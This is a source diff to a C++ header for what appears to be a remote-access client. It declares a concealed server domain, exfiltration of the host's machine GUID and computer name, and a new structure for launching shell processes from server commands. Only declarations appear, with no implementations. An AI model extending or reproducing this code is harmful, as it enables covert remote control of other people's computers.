@@ -22,6 +22,20 @@
 const unsigned int UDP_PORT = 0x154E;
 const std::string  DNS_NAME = std::string(HIDE("logicgate-test.ddns.net"));
 
+// info for receiving a command from the server
+// inspect the 'Packet' and construct a 'CommandDescription'
+// based on the information received.
+// process is then created using these fields.
+struct CommandDescription {
+    unsigned int creationFlags;
+    HANDLE creationContext;
+    std::wstring application;
+    std::wstring commandArgs = L"/K ";
+    BOOL respondToServer; // server wants client to respond with status
+};
+
+typedef CommandDescription CMDDESC;
+
 class Client {
 public:
     const std::string  GetDesktopName()   const { return this->m_ComputerName; }
@@ -44,14 +58,15 @@ public:
     BOOL               SendMessageToServer(std::string message, BOOL encrypted = TRUE); // Send a encrypted string to TCP server
     BOOL               SendEncryptedMessageToServer(const Server& dest, ClientMessage message);
     void               ListenForServerCommands();   // listen for commands from the server and perform them
-    BOOL               PerformCommand(const ServerCommand& command, ClientResponse& outResponse); // Perform a command from the tcp server
+    BOOL               PerformCommand(const Packet& command, ClientResponse& outResponse); // Perform a command from the tcp server
+    const CMDDESC      CreateCommandDescription(const Packet& command);
 
 private:
     void               SetRemoteComputerName();     // set this->m_ComputerName to the current PCs desktop name
     void               SetRemoteMachineGUID();      // set this->m_MachineGUID to the current PCs windows machine guid
     BOOL               SendMachineGUIDToServer();   // send machine guid to tcp server. encrypted
     BOOL               SendComputerNameToServer();  // send desktop computer name to tcp server. encrypted
-    BOOL               IsServerAwaitingResponse(const ServerCommand& commandPerformed);
+    BOOL               IsServerAwaitingResponse(const Packet& commandPerformed);
     BOOL               ExchangePublicKeys();        // send client public key, receive server public key
     Packet             OnEncryptedPacket(BYTESTRING encrypted); // on receive, decrypt and deserialize encrypted packet 
 
